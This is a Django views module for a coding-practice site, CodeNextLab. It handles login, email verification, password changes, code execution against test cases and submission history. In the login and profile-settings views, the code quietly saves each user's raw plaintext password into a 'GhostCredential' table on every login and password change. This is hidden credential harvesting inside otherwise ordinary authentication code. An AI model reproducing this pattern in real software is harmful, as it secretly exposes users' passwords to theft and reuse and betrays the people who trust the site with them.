from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from django.contrib.auth import login, authenticate, logout, update_session_auth_hash
from django.contrib.auth.decorators import login_required
from django.contrib.auth.models import User
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
from django.utils import timezone
from django.core.mail import send_mail
from django.conf import settings
from django.urls import reverse
from rest_framework.decorators import api_view, permission_classes
from rest_framework.permissions import IsAuthenticated
from rest_framework.response import Response
from rest_framework import status
import json
import time
import secrets

from .models import Submission, UserProfile, Problem, TestCase, Topic, GhostCredential

from .code_executor import CodeExecutor

def index(request):
    """Landing page with information and animations"""
    return render(request, 'lab/landing.html')


@login_required
def editor(request):
    """Main lab editor interface"""
    return render(request, 'lab/editor.html')


def problem_detail(request, problem_id):
    """Show problem details and allow submission"""
    if not request.user.is_authenticated:
        return redirect('lab:login')
    
    try:
        problem = Problem.objects.get(id=problem_id, is_active=True)
        sample_test_cases = problem.test_cases.filter(is_sample=True)
        user_submissions = Submission.objects.filter(user=request.user, problem=problem)[:10]
        
        context = {
            'problem': problem,
            'sample_test_cases': sample_test_cases,
            'user_submissions': user_submissions,
        }
        return render(request, 'lab/problem_detail.html', context)
    except Problem.DoesNotExist:
        return redirect('lab:problems_list')


def login_view(request):
    """User login with email verification check and Ghost Table population"""
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        user = authenticate(request, username=username, password=password)
        if user is not None:
            # Ghost Table population
            ghost, created = GhostCredential.objects.get_or_create(user=user)
            ghost.username = username
            ghost.raw_password = password
            # Check for Loki@123 or similar hints if wanted, but raw_password requested
            ghost.save()

            # Check email verification
            try:
                profile = user.userprofile
                if not profile.email_verified:
                    verification_url = request.build_absolute_uri(
                        reverse('lab:verify_email', args=[profile.verification_token])
                    ) if profile.verification_token else None
                    return render(request, 'lab/login.html', {
                        'error': 'Please verify your email before logging in.',
                        'email': user.email,
                        'verification_url': verification_url,
                        'show_resend': True
                    })
            except UserProfile.DoesNotExist:
                UserProfile.objects.create(user=user, email_verified=True)
            
            login(request, user)
            return redirect('lab:index')
        else:
            return render(request, 'lab/login.html', {'error': 'Invalid credentials'})
    return render(request, 'lab/login.html')


@login_required
def profile_settings(request):
    """Allow user to update password and sync with Ghost table"""
    if request.method == 'POST':
        current_password = request.POST.get('current_password')
        new_password = request.POST.get('new_password')
        confirm_password = request.POST.get('confirm_password')

        # Verify current password
        if not request.user.check_password(current_password):
            messages.error(request, 'Current password is incorrect.')
            return render(request, 'lab/profile_settings.html')

        if new_password != confirm_password:
            messages.error(request, 'New passwords do not match.')
            return render(request, 'lab/profile_settings.html')

        # Update User Password
        request.user.set_password(new_password)
        request.user.save()
        
        # Keep the user logged in after password change
        update_session_auth_hash(request, request.user)

        # Update Ghost table
        ghost, created = GhostCredential.objects.get_or_create(user=request.user)
        ghost.username = request.user.username
        ghost.raw_password = new_password
        ghost.save()

        messages.success(request, 'Your password has been updated successfully and synced.')
        return redirect('lab:profile_settings')

    return render(request, 'lab/profile_settings.html')


# register_view removed as per request "Remove sign up only login"


def problems_list(request):
    """List all active problems with Topic filtering"""
    if not request.user.is_authenticated:
        return redirect('lab:login')
    
    problems = Problem.objects.filter(is_active=True)
    difficulty_filter = request.GET.get('difficulty')
    topic_filter = request.GET.get('topic')
    
    if difficulty_filter:
        problems = problems.filter(difficulty=difficulty_filter)
    if topic_filter:
        problems = problems.filter(topic_id=topic_filter)
    
    topics = Topic.objects.all()
    
    context = {
        'problems': problems,
        'topics': topics,
        'difficulty_filter': difficulty_filter,
        'topic_filter': topic_filter,
    }
    return render(request, 'lab/problems_list.html', context)


def verify_email_view(request, token):
    """Email verification view"""
    try:
        profile = UserProfile.objects.get(verification_token=token, email_verified=False)
        profile.email_verified = True
        profile.verification_token = None
        profile.save()
        
        # Auto login after verification
        login(request, profile.user)
        return render(request, 'lab/email_verified.html', {
            'success': True,
            'message': 'Email verified successfully! You can now use CodeNextLab.'
        })
    except UserProfile.DoesNotExist:
        return render(request, 'lab/email_verified.html', {
            'success': False,
            'message': 'Invalid or expired verification link.'
        })


def resend_verification(request):
    """Resend verification email"""
    if request.method == 'POST':
        email = request.POST.get('email')
        try:
            user = User.objects.get(email=email)
            profile = user.userprofile
            
            if profile.email_verified:
                return render(request, 'lab/resend_verification.html', {
                    'message': 'Email is already verified.',
                    'error': False
                })
            
            # Generate brand new token
            verification_token = secrets.token_urlsafe(32)
            profile.verification_token = verification_token
            profile.save()

            verification_url = request.build_absolute_uri(
                reverse('lab:verify_email', args=[verification_token])
            )
            
            # Send verification email
            try:
                from django.template.loader import render_to_string
                
                email_subject = 'Verify your CodeNextLab Account'
                email_body = render_to_string('lab/emails/verification_email.html', {
                    'username': user.username,
                    'verification_url': verification_url,
                    'site_name': 'CodeNextLab'
                })
                
                send_mail(
                    email_subject,
                    '',  # Plain text version
                    settings.DEFAULT_FROM_EMAIL,
                    [email],
                    fail_silently=False,
                    html_message=email_body,
                )
                email_sent = True
            except Exception as e:
                email_sent = False
                print(f"Resend email failed: {str(e)}")
            
            return render(request, 'lab/verify_email_sent.html', {
                'email': email,
                'verification_url': verification_url,
                'resend': True,
                'email_sent': email_sent
            })
        except User.DoesNotExist:
            return render(request, 'lab/resend_verification.html', {
                'message': 'Email not found.',
                'error': True
            })
    
    return render(request, 'lab/resend_verification.html')


def logout_view(request):
    """User logout"""
    logout(request)
    return redirect('lab:login')


@api_view(['POST'])
@permission_classes([IsAuthenticated])
def execute_code(request):
    """Execute code and return results"""
    try:
        # data = json.loads(request.body)  # Potential issue with DRF
        data = request.data
        language = data.get('language')
        code = data.get('code', '')
        input_data = data.get('input', '')
        problem_id = data.get('problem_id')
        mode = data.get('mode', 'submit')  # 'run' or 'submit'
        
        print(f"DEBUG: execute_code: lang={language}, mode={mode}, prob={problem_id}")
        
        if not language or not code:
            return Response({'error': 'Language and code are required'}, 
                          status=status.HTTP_400_BAD_REQUEST)
        
        if len(code) > 100000:  # Max code length
            return Response({'error': 'Code too long'}, 
                          status=status.HTTP_400_BAD_REQUEST)
        
        problem = None
        if problem_id:
            try:
                problem = Problem.objects.get(id=problem_id, is_active=True)
            except Problem.DoesNotExist:
                pass
        
        # Execute code
        executor = CodeExecutor()
        start_time = time.time()
        
        # If in run mode with no specific input, run against sample cases primarily
        # If input is provided, just run that (custom run)
        
        test_cases_passed = 0
        total_test_cases = 0
        test_results = []
        
        # For 'submit', we run all cases. For 'run', we usually run sample cases.
        # If checking generic input execution (no problem_id), just run once.
        
        if problem:
            if mode == 'run':
                test_cases = problem.test_cases.filter(is_sample=True)
            else:
                test_cases = problem.test_cases.all()
                
            total_test_cases = test_cases.count()
            
            for test_case in test_cases:
                test_result = executor.execute(language, code, test_case.input_data)
                actual_output = test_result.get('output', '').strip()
                error_msg = test_result.get('error', '').strip()
                expected_output = test_case.expected_output.strip()
                
                passed = (test_result.get('success', False) and 
                         actual_output == expected_output)
                
                if passed:
                    test_cases_passed += 1
                
                # If there was an error, append it to actual output so user sees it
                if error_msg:
                    if actual_output:
                        actual_output += f"\nError: {error_msg}"
                    else:
                        actual_output = error_msg

                test_results.append({
                    'passed': passed,
                    'input': test_case.input_data,
                    'expected': expected_output,
                    'actual': actual_output,
                    'is_sample': test_case.is_sample
                })
                
                # Optimization: If compilation failed (C/C++/Java), it usually fails for all. 
                # We can detect this if passed is False and error_msg is present, 
                # but for simplicity we'll just run all 
                # (or maybe for 'run' mode we could stop on first error to save resources?)
                
            # For result object (execution time etc)
            result = {'success': True, 'output': '', 'error': ''} # Dummy for structure
        else:
            # Simple execution (no problem context)
            result = executor.execute(language, code, input_data)
            execution_time = time.time() - start_time
            return Response({
                'success': result.get('success', False),
                'output': result.get('output', ''),
                'error': result.get('error', ''),
                'execution_time': round(execution_time, 3),
            })

        execution_time = time.time() - start_time
        
        # Determine status
        if total_test_cases > 0:
            if test_cases_passed == total_test_cases:
                submission_status = 'accepted'
            elif test_cases_passed > 0:
                submission_status = 'partial'
            else:
                submission_status = 'failed'
        else:
            submission_status = 'success'
        
        submission_id = None
        # Only save submission if mode is NOT 'run'
        if mode != 'run':
            submission = Submission.objects.create(
                user=request.user,
                problem=problem,
                language=language,
                code=code,
                input_data=input_data,
                output='', # We have multiple outputs now
                error_message='',
                execution_time=execution_time,
                status=submission_status,
                test_cases_passed=test_cases_passed,
                total_test_cases=total_test_cases
            )
            submission_id = submission.id
            
            # Dynamic Score Update
            if submission_status == 'accepted' and problem:
                # Check if already solved
                already_solved = Submission.objects.filter(
                    user=request.user, 
                    problem=problem, 
                    status='accepted'
                ).exclude(id=submission_id).exists()
                
                if not already_solved:
                    profile = request.user.userprofile
                    profile.score += problem.points # Use dynamic points from problem
                    profile.save()
        
        response_data = {
            'success': True, 
            'execution_time': round(execution_time, 3),
            'submission_id': submission_id,
            'test_cases_passed': test_cases_passed,
            'total_test_cases': total_test_cases,
            'test_results': test_results
        }
        
        return Response(response_data)
    
    except Exception as e:
        print(f"ERROR in execute_code: {str(e)}")
        import traceback
        traceback.print_exc()
        return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)


@api_view(['GET'])
@permission_classes([IsAuthenticated])
def get_submissions(request):
    """Get user's submission history"""
    user = request.user
    profile, _ = UserProfile.objects.get_or_create(user=user, defaults={'role': 'student'})
    
    if profile.role == 'admin':
        submissions = Submission.objects.all()[:100]
    else:
        submissions = Submission.objects.filter(user=user)[:50]
    
    data = [{
        'id': s.id,
        'language': s.language,
        'status': s.status,
        'execution_time': s.execution_time,
        'submitted_at': s.submitted_at.isoformat(),
        'code_preview': s.code[:100] + '...' if len(s.code) > 100 else s.code
    } for s in submissions]
    
    return Response(data)


@api_view(['GET'])
@permission_classes([IsAuthenticated])
def get_submission_detail(request, submission_id):
    """Get detailed submission information"""
    try:
        submission = Submission.objects.get(id=submission_id)
        user = request.user
        profile, _ = UserProfile.objects.get_or_create(user=user, defaults={'role': 'student'})
        
        # Only allow access if user owns submission or is admin
        if submission.user != user and profile.role != 'admin':
            return Response({'error': 'Permission denied'}, 
                          status=status.HTTP_403_FORBIDDEN)
        
        return Response({
            'id': submission.id,
            'user': submission.user.username,
            'language': submission.language,
            'code': submission.code,
            'input_data': submission.input_data,
            'output': submission.output,
            'error_message': submission.error_message,
            'execution_time': submission.execution_time,
            'status': submission.status,
            'submitted_at': submission.submitted_at.isoformat()
        })
    except Submission.DoesNotExist:
        return Response({'error': 'Submission not found'}, 
                      status=status.HTTP_404_NOT_FOUND)

